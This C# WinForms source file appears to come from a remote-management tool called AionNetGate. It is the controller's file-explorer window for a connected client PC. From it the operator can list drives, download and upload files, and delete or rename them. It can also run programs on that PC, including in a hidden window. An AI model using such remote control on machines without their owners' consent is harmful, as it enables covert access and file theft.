
using AionCommons.Unilty;
using AionCommons.WinForm;
using AionNetGate.Netwok;
using AionNetGate.Netwok.Server;
using AionNetGate.Services;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace AionNetGate
{
    /// <summary>
    /// 灰色枫叶 QQ93900604
    /// </summary>
    public partial class ExplorerForm : Form
    {
        /// <summary>
        /// 客户端连接
        /// </summary>
        private AionConnection con;
        /// <summary>
        /// 当前路径
        /// </summary>
        private string filePath;
        /// <summary>
        /// 计算目录读取时间
        /// </summary>
        private DateTime readCostTime;
        /// <summary>
        /// 构造方法
        /// </summary>
        /// <param name="connect"></param>
        public ExplorerForm(ref AionConnection connect)
        {
            InitializeComponent();
            con = connect;
            this.Text = con.getIP() + "[" + con.GetHashCode() + "]的电脑";
        }


        /// <summary>
        /// 窗体初始化
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ExplorerForm_Load(object sender, EventArgs e)
        {
            try
            {
                //获取系统图标
                Int16[] ints = new Int16[] { 15, 5, 8, 11, 3, 4, 101 };
                foreach (Int16 i in ints)
                {
                    TreeImageList.Images.Add(IconMake.myExtractIcon(i));
                }
                //LIST列表添加电脑名
                treeView1.Nodes.Add(con.computerName);

                this.Icon = IconMake.myExtractIcon(15);
                this.listView_File.ListViewItemSorter = new ListViewColumnSorter();
                this.listView_File.ColumnClick += new ColumnClickEventHandler(ListView_ColumnClick);
                DoubleBufferListView.DoubleBufferedListView(listView_down, true);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        /// <summary>
        /// LISTVIEW 排序
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ListView_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            ListView lv = sender as ListView;
            ListViewColumnSorter lvcs = lv.ListViewItemSorter as ListViewColumnSorter;
            // 检查点击的列是不是现在的排序列.
            if (e.Column == lvcs.SortColumn)
            {
                // 重新设置此列的排序方法.
                lvcs.Order = lvcs.Order == SortOrder.Ascending ? SortOrder.Descending : SortOrder.Ascending;
            }
            else
            {
                //设置排序列，默认为正向排序
                lvcs.SortColumn = e.Column;
                lvcs.Order = SortOrder.Ascending;
            }
            // 用新的排序方法对ListView排序
            lv.Sort();
        }


        /// <summary>
        /// 左侧列表单击
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
        {
            if (e.Node.Parent != null)
            {
                string s = e.Node.Tag.ToString();
                getDirAndFiles(s);
                filePath = s;
                toolStripComboBox1.Text = s;
            }
            else //等于空 说明 是顶级目录
            {
                getDirAndFiles("");
                filePath = "";
                toolStripComboBox1.Text = "";
            }

        }

        /// <summary>
        /// 发送远程封包以获取相应的文件夹和文件信息
        /// </summary>
        /// <param name="dir">目录</param>
        private void getDirAndFiles(string dir)
        {
            readCostTime = DateTime.Now;
            con.SendPacket(new SM_EXPLORER_PC(dir, dir.Equals("") ? FileTpye.SHOW_DRIVES : FileTpye.SHOW_FILE_OR_DIR));
        }

        #region 文件大小容量单位换算
        const int GB = 1024 * 1024 * 1024;//定义GB的计算常量
        const int MB = 1024 * 1024;//定义MB的计算常量
        const int KB = 1024;//定义KB的计算常量
        /// <summary>
        /// 
        /// </summary>
        /// <param name="KSize"></param>
        /// <returns></returns>
        private string ByteToGBMBKB(long KSize)
        {
            if (KSize / GB >= 1)//如果当前Byte的值大于等于1GB
                return (Math.Round(KSize / (float)GB, 2)).ToString() + "GB";//将其转换成GB
            else if (KSize / MB >= 1)//如果当前Byte的值大于等于1MB
                return (Math.Round(KSize / (float)MB, 2)).ToString() + "MB";//将其转换成MB
            else if (KSize / KB >= 1)//如果当前Byte的值大于等于1KB
                return (Math.Round(KSize / (float)KB, 2)).ToString() + "KB";//将其转换成KGB
            else
                return KSize.ToString() + "Byte";//显示Byte值
        }
        #endregion

        #region 显示文件和文件夹的ListView事件
        /// <summary>
        /// 刷新listView
        /// </summary>
        /// <param name="drives"></param>
        /// <param name="dirs"></param>
        /// <param name="files"></param>
        public void showDirAndFiles(string[] drives, string[] dirs, string[] files)
        {
            // 修复：确保在UI线程中执行
            if (this.InvokeRequired)
            {
                this.BeginInvoke(new Action<string[], string[], string[]>(showDirAndFiles), drives, dirs, files);
                return;
            }

            // 修复：检查窗体是否已释放
            if (this.IsDisposed || listView_File.IsDisposed)
                return;

            //大图标列表
            ImageList large = new ImageList();
            large.ColorDepth = ColorDepth.Depth32Bit;
            large.ImageSize = new System.Drawing.Size(32, 32);
            //小图标列表
            ImageList small = new ImageList();
            small.ColorDepth = ColorDepth.Depth32Bit;
            small.ImageSize = new System.Drawing.Size(16, 16);

            List<TreeNode> leftTreeNodes = null;
            List<ListViewItem> list = new List<ListViewItem>();

            //磁盘驱动器
            if (drives != null)
            {
                Icon driverIcon = IconMake.myExtractIcon(8);
                small.Images.Add(driverIcon);
                large.Images.Add(driverIcon);

                leftTreeNodes = new List<TreeNode>();
                foreach (string s in drives)
                {
                    string[] rs = s.Split('\t');
                    if (rs[0].Contains("A:") || rs[0].Equals("本地磁盘"))
                        continue;
                    ListViewItem ls = new ListViewItem(rs, 0);
                    ls.Tag = 0; //0为驱动器
                    list.Add(ls);

                    TreeNode tn = new TreeNode(rs[0], 2, 2);
                    tn.Tag = rs[0].Substring(rs[0].Length - 3, 2) + "\\"; //添加  C:\  标识 到tag上，方便使用
                    leftTreeNodes.Add(tn);
                }
            }
            else //文件夹和文件
            {
                Icon icon0 = IconMake.myExtractIcon(3);
                small.Images.Add(icon0);
                large.Images.Add(icon0);

                //获得当前目录下的所有文件 
                if (dirs != null && dirs.Length > 0)
                {
                    foreach (string s in dirs)
                    {
                        string[] arrSubItem = s.Split('\t');
                        ListViewItem LiItem = new ListViewItem(arrSubItem, 0);
                        LiItem.Tag = 1; //1为文件夹
                        list.Add(LiItem);
                    }
                }

                if (files != null && files.Length > 0)
                {
                    int index = 0; //用1，而不用0是要让过0号图标。
                    bool isSystem32 = filePath.ToLower().Contains("windows\\system32");
                    if (isSystem32)
                    {
                        int[] ic = new int[] { 0, 2, 69, 70, 72 };
                        foreach (int i in ic)
                        {
                            small.Images.Add(IconMake.myExtractIcon(i));
                            large.Images.Add(IconMake.myExtractIcon(i));
                        }
                    }
                    foreach (string s in files)
                    {
                        try
                        {
                            string[] rs = s.Split('\t');
                            // 修复：验证数组长度，防止索引越界
                            if (rs.Length < 4)
                            {
                                System.Diagnostics.Debug.WriteLine("文件信息格式错误: " + s);
                                continue;
                            }

                            // 修复：安全地解析文件大小
                            long fileSize = 0;
                            if (!long.TryParse(rs[1], out fileSize))
                            {
                                fileSize = 0;
                            }

                            string[] arrSubItem = new string[4] { rs[0], ByteToGBMBKB(fileSize), rs[2], rs[3] };

                            //得到每个文件的图标
                            if (!isSystem32)
                            {
                                string sf = filePath + rs[0];
                                try
                                {
                                    Icon Sicon = FileIcon.GetFileIcon(sf, false);
                                    Icon Licon = FileIcon.GetFileIcon(sf, true);
                                    small.Images.Add(Sicon);
                                    large.Images.Add(Licon);
                                    index++;
                                }
                                catch (Exception ex)
                                {
                                    // 修复：使用默认图标而不是显示错误对话框
                                    System.Diagnostics.Debug.WriteLine("获取文件图标失败: " + ex.Message);
                                    Icon defaultIcon = IconMake.myExtractIcon(0);
                                    small.Images.Add(defaultIcon);
                                    large.Images.Add(defaultIcon);
                                    index++;
                                }
                            }
                            else
                            {
                                if (rs[0].EndsWith("dll"))
                                    index = 5;
                                else if (rs[0].EndsWith("exe"))
                                    index = 2;
                                else if (rs[0].EndsWith("log") || rs[0].EndsWith("txt"))
                                    index = 4;
                                else if (rs[0].EndsWith("ini") || rs[0].EndsWith("inf"))
                                    index = 3;
                                else
                                    index = 1;
                            }
                            ListViewItem LiItem = new ListViewItem(arrSubItem, index);
                            LiItem.Tag = 2;
                            list.Add(LiItem);
                        }
                        catch (Exception ex)
                        {
                            System.Diagnostics.Debug.WriteLine("处理文件项失败: " + ex.Message);
                            continue;
                        }
                    }
                }
            }

            // 修复：直接在UI线程更新，无需再次调用Invoke
            try
            {
                if (leftTreeNodes != null && treeView1.Nodes.Count > 0)
                {
                    treeView1.Nodes[0].Nodes.Clear();//列表先清空
                    treeView1.Nodes[0].Nodes.AddRange(leftTreeNodes.ToArray());
                    treeView1.Nodes[0].Expand();
                }

                if (filePath == "")
                {
                    listView_File.Columns[1].Text = "可用空间";
                    listView_File.Columns[2].Text = "总大小";
                    listView_File.Columns[3].Text = "类型";
                }
                else
                {
                    listView_File.Columns[1].Text = "大小";
                    listView_File.Columns[2].Text = "创建时间";
                    listView_File.Columns[3].Text = "修改时间";
                }

                // 修复：安全地设置图像列表
                if (listView_File.SmallImageList != null)
                {
                    listView_File.SmallImageList.Dispose();
                }
                if (listView_File.LargeImageList != null)
                {
                    listView_File.LargeImageList.Dispose();
                }

                listView_File.SmallImageList = small;
                listView_File.LargeImageList = large;
                listView_File.Items.Clear();
                listView_File.BeginUpdate();

                // 修复：分批添加项目，避免UI冻结
                if (list.Count > 100)
                {
                    for (int i = 0; i < list.Count; i += 50)
                    {
                        int count = Math.Min(50, list.Count - i);
                        ListViewItem[] batch = new ListViewItem[count];
                        list.CopyTo(i, batch, 0, count);
                        listView_File.Items.AddRange(batch);
                        Application.DoEvents(); // 允许UI响应
                    }
                }
                else
                {
                    listView_File.Items.AddRange(list.ToArray());
                }

                listView_File.EndUpdate();

                int dir_count = dirs != null ? dirs.Length : 0;
                int file_count = files != null ? files.Length : 0;
                int drive_count = drives != null ? drives.Length : 0;

                toolStripStatusLabel_count.Text = (drive_count + dir_count + file_count) + " 个项目";
                Bar_dir_count.Text = "其中文件夹数量：" + dir_count.ToString();
                Bar_file_count.Text = "文件数量：" + file_count.ToString();
                Bar_info.Text = "读取目录耗时 " + (DateTime.Now - readCostTime).TotalMilliseconds.ToString("f1") + " 毫秒";
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine("更新文件列表失败: " + ex.Message);
                MessageBox.Show("更新文件列表时发生错误: " + ex.Message, "错误", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }

        }

        /// <summary>
        /// 双击列表框文件夹或者文件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void listView_File_ItemActivate(object sender, EventArgs e)
        {
            string str = Path.Combine(filePath, listView_File.FocusedItem.Text);
            try
            {
                byte b = byte.Parse(listView_File.FocusedItem.Tag.ToString());
                if (b == 0) //硬盘
                {
                    str = listView_File.FocusedItem.Text.Substring(listView_File.FocusedItem.Text.Length - 3, 2) + "\\";
                    getDirAndFiles(str);
                    filePath = str;//把路径赋值于全局变量fileName

                    //更新地址栏历史纪录
                    if (!toolStripComboBox1.Items.Contains(filePath))
                    {
                        toolStripComboBox1.Items.Add(filePath);
                        if (toolStripComboBox1.Items.Count >= 10)
                        {
                            toolStripComboBox1.Items.RemoveAt(0);
                        }
                    }
                    toolStripComboBox1.SelectedItem = filePath;
                    toolStripComboBox1.Text = filePath;
                    loc = toolStripComboBox1.Items.Count;
                }
                else if (b == 1) //文件夹
                {
                    getDirAndFiles(str);
                    filePath = str;//把路径赋值于全局变量fileName

                    //更新地址栏历史纪录
                    if (!toolStripComboBox1.Items.Contains(filePath))
                    {
                        toolStripComboBox1.Items.Add(filePath);
                        if (toolStripComboBox1.Items.Count >= 10)
                        {
                            toolStripComboBox1.Items.RemoveAt(0);
                        }
                    }
                    toolStripComboBox1.SelectedItem = filePath;
                    toolStripComboBox1.Text = filePath;
                    loc = toolStripComboBox1.Items.Count;
                }
                else
                {
                    if (MessageBox.Show("无法直接运行远程电脑文件，是否下载到本机？", "提醒", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == System.Windows.Forms.DialogResult.Yes)
                    {
                        DownLoadFileOrDir();
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }
        #endregion

        #region 上下文菜单事件（鼠标右键菜单事件）
        /// <summary>
        /// 复制文件或者文件夹
        /// </summary>
        private string copyFile;
        /// <summary>
        /// 菜单事件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void contextMenuStrip1_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
        {
            ToolStripItem tsi = (ToolStripItem)e.ClickedItem;
            string text = tsi.Text.Split('(')[0];
            switch (text)
            {
                case "刷新":
                    getDirAndFiles(filePath);
                    break;
                case "复制":
                    if (listView_File.FocusedItem == null)
                        return;
                    copyFile = Path.Combine(filePath, listView_File.FocusedItem.Text);
                    粘贴PToolStripMenuItem.Enabled = true;
                    break;
                case "粘贴":
                    con.SendPacket(new SM_EXPLORER_PC(copyFile + "\t" + filePath, FileTpye.COPY_FILE_OR_DIR));
                    粘贴PToolStripMenuItem.Enabled = false;
                    copyFile = null;
                    break;
                case "删除":
                    if (listView_File.FocusedItem == null)
                        return;
                    con.SendPacket(new SM_EXPLORER_PC(Path.Combine(filePath, listView_File.FocusedItem.Text), FileTpye.DEL_FILE_OR_DIR));
                    listView_File.Items.Remove(listView_File.FocusedItem);
                    break;
                case "下载":
                    contextMenuStrip1.Close();
                    DownLoadFileOrDir();
                    break;
                case "上传":
                    contextMenuStrip1.Close();
                    UpLoadFileOrDir();
                    break;
                case "新建文件夹":
                    string newFolder = getNewFolderName();
                    ListViewItem LiItem = new ListViewItem(newFolder, 0);
                    LiItem.Tag = 1; //1为文件夹
                    listView_File.Items.Add(LiItem);
                    con.SendPacket(new SM_EXPLORER_PC(Path.Combine(filePath, newFolder), FileTpye.NEW_FOLDER));
                    break;
                case "重命名":
                    if (listView_File.FocusedItem == null)
                        return;
                    listView_File.FocusedItem.BeginEdit();
                    break;
                case "属性":
                    if (listView_File.FocusedItem == null)
                        return;
                    string str = string.Format("项目名称：{0}\r\n项目大小：{1}\r\n创建时间：{2}\r\n修改时间：{3}",
                        listView_File.FocusedItem.SubItems[0].Text,
                        listView_File.FocusedItem.SubItems[1].Text,
                        listView_File.FocusedItem.SubItems[2].Text,
                        listView_File.FocusedItem.SubItems[3].Text
                        );
                    MessageBox.Show(str, "属性", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    break;
            }
        }

        /// <summary>
        /// 获取不冲突的新建文件夹名称
        /// </summary>
        /// <returns></returns>
        private string getNewFolderName()
        {
            bool same = true;
            int i = 1;
            string folder = "新建文件夹";
            while (same)
            {
                same = false;
                foreach (ListViewItem l in listView_File.Items)
                {
                    if (l.Text.Equals(folder))
                    {
                        i++;
                        folder = "新建文件夹 (" + i + ")";
                        same = true;
                        break;
                    }
                }
            }
            return folder;
        }

        /// <summary>
        /// 查看菜单
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void 查看ToolStripMenuItem_DropDownItemClicked(object sender, ToolStripItemClickedEventArgs e)
        {
            ToolStripMenuItem cms = (ToolStripMenuItem)e.ClickedItem;
            switch (cms.Text)
            {
                case "大图标":
                    listView_File.View = View.LargeIcon;
                    break;
                case "小图标":
                    listView_File.View = View.SmallIcon;
                    break;
                case "列表":
                    listView_File.View = View.List;
                    break;
                case "详细信息":
                    listView_File.View = View.Details;
                    break;
                case "平铺":
                    listView_File.View = View.Tile;
                    break;
            }
        }
        /// <summary>
        /// 运行菜单
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripMenuItem3_DropDownItemClicked(object sender, ToolStripItemClickedEventArgs e)
        {
            if (listView_File.FocusedItem == null)
                return;
            ToolStripMenuItem cms = (ToolStripMenuItem)e.ClickedItem;
            string args = "";
            switch (cms.Text)
            {
                case "隐藏运行":
                    args = "hidden";
                    break;
                case "最小化运行":
                    args = "min";
                    break;
                case "最大化运行":
                    args = "max";
                    break;
                case "正常运行":
                    break;
                case "参数运行":
                    break;
            }
            con.SendPacket(new SM_EXPLORER_PC(Path.Combine(filePath, listView_File.FocusedItem.Text) + "\t" + args, FileTpye.RUN_FILE_COMMAND));
        }
        #endregion

        #region 工具栏按钮事件
        /// <summary>
        /// 工具栏- 向上按钮
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripButton3_Click(object sender, EventArgs e)
        {
            int n = filePath.LastIndexOf("\\");
            if (filePath.Length == 3)//磁盘符目录
            {
                filePath = "";
                getDirAndFiles("");
                toolStripComboBox1.Text = "";
            }
            else if (n != -1)
            {
                if (n <= 2)
                    n = 3;
                filePath = filePath.Substring(0, n);
                toolStripComboBox1.Text = filePath;
                getDirAndFiles(filePath);
            }
        }

        /// <summary>
        /// 前进和后退按钮
        /// </summary>
        private int loc = 0;
        /// <summary>
        /// 工具栏-前进
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            if (loc == toolStripComboBox1.Items.Count)
            {
                string path = toolStripComboBox1.Items[loc - 1].ToString();
                if (filePath != path)
                {
                    getDirAndFiles(path);
                    filePath = path;
                    toolStripComboBox1.Text = path;
                }
                return;
            }
            string pa = toolStripComboBox1.Items[loc].ToString();
            getDirAndFiles(pa);
            filePath = pa;
            toolStripComboBox1.Text = pa;
            loc++;
        }


        /// <summary>
        /// 工具栏后退
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            if (loc == 0)
                loc = toolStripComboBox1.Items.Count;
            if (loc > 1) //至少有2个记录
            {
                string path = toolStripComboBox1.Items[loc - 2].ToString(); //获取最后的一个目录（这里需要判断最后一个目录是否是当前目录）
                loc--;
                getDirAndFiles(path);
                filePath = path;
                toolStripComboBox1.Text = path;
            }
        }

        /// <summary>
        /// 工具栏-刷新
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripButton4_Click(object sender, EventArgs e)
        {
            getDirAndFiles(filePath);
        }
        #endregion

        /// <summary>
        /// 地址栏下拉框跳转到目录
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripComboBox1_DropDownClosed(object sender, EventArgs e)
        {
            ToolStripComboBox ts = (ToolStripComboBox)sender;
            if (ts.SelectedItem == null)
                return;
            string s = ts.SelectedItem.ToString();
            getDirAndFiles(s);
            filePath = s;
            ts.Text = s;
        }

        /// <summary>
        /// 重命名结束后
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void listView_File_AfterLabelEdit(object sender, LabelEditEventArgs e)
        {
            if (listView_File.FocusedItem == null || e.Label == null)
                return;
            if (listView_File.FocusedItem.Tag.ToString().Equals("0"))//如果是硬盘盘符则不能改名
                return;

            if (e.Label.Equals(listView_File.FocusedItem.SubItems[0].Text))
                return;
            //老名字（绝对路径）\t 新名字  ， 类型
            con.SendPacket(new SM_EXPLORER_PC(Path.Combine(filePath, listView_File.FocusedItem.Text) + "\t" + Path.Combine(filePath, e.Label), FileTpye.RENAME));
        }

        /// <summary>
        /// 下载文件夹或者文件
        /// </summary>
        private void DownLoadFileOrDir()
        {
            if (listView_File.FocusedItem == null || filePath == "")
                return;
            string tag = listView_File.FocusedItem.Tag.ToString();
            if (tag.Equals("0"))//如果是磁盘盘符 则返回
                return;

            //弹出保存对话框
            using (SaveFileDialog sf = new SaveFileDialog())
            {
                sf.FileName = listView_File.FocusedItem.Text.ToString();
                if (sf.ShowDialog() == DialogResult.OK)
                {
                    sf.Title = "请选择保存位置";
                    DownFileInfo df = new DownFileInfo(listView_File.FocusedItem.Text, Path.Combine(filePath, listView_File.FocusedItem.Text), listView_File.FocusedItem.SubItems[1].Text, sf.FileName);
                    ListViewItem lv = new ListViewItem(new string[] { df.Name, "", "", "", "" }, tag.Equals("1") ? 0 : 1);
                    lv.ToolTipText = string.Format("[项目下载信息]\r\n项目名称：{0}\r\n项目大小：{1}\r\n远程位置：{2}\r\n保存位置：{3}\r\n",
                        df.Name,
                        df.Size,
                        df.FullName,
                        df.SaveFullName);
                    lv.Tag = df;
                    listView_down.Items.Add(lv);
                    //添加下载任务
                    DownFileServer.Instance.AddTask(ref listView_down);
                    //通知客户端发送文件
                    con.SendPacket(new SM_EXPLORER_PC(lv.GetHashCode(), df.FullName, FileTpye.DOWN_FILE_OR_DIR));
                }
            }
        }

        /// <summary>
        /// 上传文件或者文件夹
        /// </summary>
        private void UpLoadFileOrDir()
        {
            if (filePath.Equals(""))
                return;
            using (OpenFileDialog of = new OpenFileDialog())
            {
                of.Multiselect = false;
                of.Title = "请选择需要上传到客户端的文件";
                if (of.ShowDialog() == DialogResult.OK)
                {
                    DownFileInfo df = new DownFileInfo(of.SafeFileName, of.FileName, ByteToGBMBKB(new FileInfo(of.FileName).Length), Path.Combine(filePath, of.SafeFileName));
                    ListViewItem lv = new ListViewItem(new string[] { df.Name, "", "", "", "" }, 2);
                    lv.ToolTipText = string.Format("[项目上传信息]\r\n项目名称：{0}\r\n项目大小：{1}\r\n本地位置：{2}\r\n保存位置：{3}\r\n",
                        df.Name,
                        df.Size,
                        df.FullName,
                        df.SaveFullName);
                    lv.Tag = df;
                    listView_down.Items.Add(lv);
                    //添加下载任务
                    DownFileServer.Instance.AddTask(ref listView_down);
                    //通知客户端发送文件
                    con.SendPacket(new SM_EXPLORER_PC(lv.GetHashCode(), df.SaveFullName, FileTpye.UPLOAD_FILE_OR_DIR));
                }
            }

        }

        /// <summary>
        /// 下载任务的LISTVIEW右键 上下文菜单事件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void contextMenuStrip2_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
        {
            if (listView_down.SelectedItems.Count == 0)
                return;

            ToolStripItem tsi = (ToolStripItem)e.ClickedItem;
            string text = tsi.Text;
            switch (text)
            {
                case "从列表中删除项目":
                    foreach (ListViewItem i in listView_down.SelectedItems)
                    {
                        if (i.SubItems[3].Text.Equals("100.00%"))
                            listView_down.Items.Remove(i);
                        else
                        {
                            MessageBox.Show("[" + i.Text + "]正在下载/上传中，已跳过！", "警告");
                            continue;
                        }

                    }
                    break;
                case "停止当前下载(上传)":
                    listView_down.FocusedItem.SubItems[1].Tag = "1";
                    break;
                case "重新启动下载(上传)":
                    if (listView_down.FocusedItem.SubItems[1].Tag != null)
                    {
                        listView_down.FocusedItem.SubItems[1].Tag = null;
                        DownFileInfo df = (DownFileInfo)listView_down.FocusedItem.Tag;
                        if (listView_down.FocusedItem.ImageIndex == 2)
                            con.SendPacket(new SM_EXPLORER_PC(listView_down.FocusedItem.GetHashCode(), df.SaveFullName, FileTpye.UPLOAD_FILE_OR_DIR));
                        else
                            con.SendPacket(new SM_EXPLORER_PC(listView_down.FocusedItem.GetHashCode(), df.FullName, FileTpye.DOWN_FILE_OR_DIR));
                    }
                    break;
            }
        }

        /// <summary>
        /// 窗口关闭
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ExplorerForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            //删除下载任务
            DownFileServer.Instance.RemoveTask(ref listView_down);
            if (listView_down.Items != null && listView_down.Items.Count > 0)
            {
                foreach (ListViewItem lvi in listView_down.Items)
                {
                    lvi.SubItems[1].Tag = "1"; //停止所有正在进行的任务
                }
            }
        }
    }

    #region 文件图标获取类
    public class FileIcon
    {
        /// <summary>
        ///  获取文件的默认图标
        /// </summary>
        /// <param name="fileName">文件名。
        ///     可以只是文件名，甚至只是文件的扩展名(.*)；
        ///     如果想获得.ICO文件所表示的图标，则必须是文件的完整路径。
        /// </param>
        /// <param name="largeIcon">是否大图标</param>
        /// <returns>文件的默认图标</returns>
        public static Icon GetFileIcon(string fileName, bool largeIcon)
        {
            SHFILEINFO info = new SHFILEINFO(true);
            int cbFileInfo = Marshal.SizeOf(info);
            SHGFI flags;
            if (largeIcon)
                flags = SHGFI.Icon | SHGFI.LargeIcon | SHGFI.UseFileAttributes;
            else
                flags = SHGFI.Icon | SHGFI.SmallIcon | SHGFI.UseFileAttributes;

            SHGetFileInfo(fileName, 0, out info, (uint)cbFileInfo, flags);

            return Icon.FromHandle(info.hIcon);
        }

        [DllImport("Shell32.dll")]
        private static extern int SHGetFileInfo(string pszPath, uint dwFileAttributes, out SHFILEINFO psfi, uint cbfileInfo, SHGFI uFlags);

        [StructLayout(LayoutKind.Sequential)]
        private struct SHFILEINFO
        {
            public SHFILEINFO(bool b)
            {
                hIcon = IntPtr.Zero;
                iIcon = 0;
                dwAttributes = 0;
                szDisplayName = "";
                szTypeName = "";
            }
            public IntPtr hIcon;
            public int iIcon;
            public uint dwAttributes;
            [MarshalAs(UnmanagedType.LPStr, SizeConst = 260)]
            public string szDisplayName;
            [MarshalAs(UnmanagedType.LPStr, SizeConst = 80)]
            public string szTypeName;
        };

        private enum SHGFI
        {
            SmallIcon = 0x00000001,
            LargeIcon = 0x00000000,
            Icon = 0x00000100,
            DisplayName = 0x00000200,
            Typename = 0x00000400,
            SysIconIndex = 0x00004000,
            UseFileAttributes = 0x00000010
        }
    }
    #endregion


    public static class DoubleBufferListView
    {
        /// <summary>  
        /// 双缓冲，解决闪烁问题  
        /// </summary>  
        /// <param name="lv"></param>  
        /// <param name="flag"></param>  
        public static void DoubleBufferedListView(ListView lv, bool flag)
        {
            Type lvType = lv.GetType();
            System.Reflection.PropertyInfo pi = lvType.GetProperty("DoubleBuffered", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic);
            pi.SetValue(lv, flag, null);
        }

    }
}
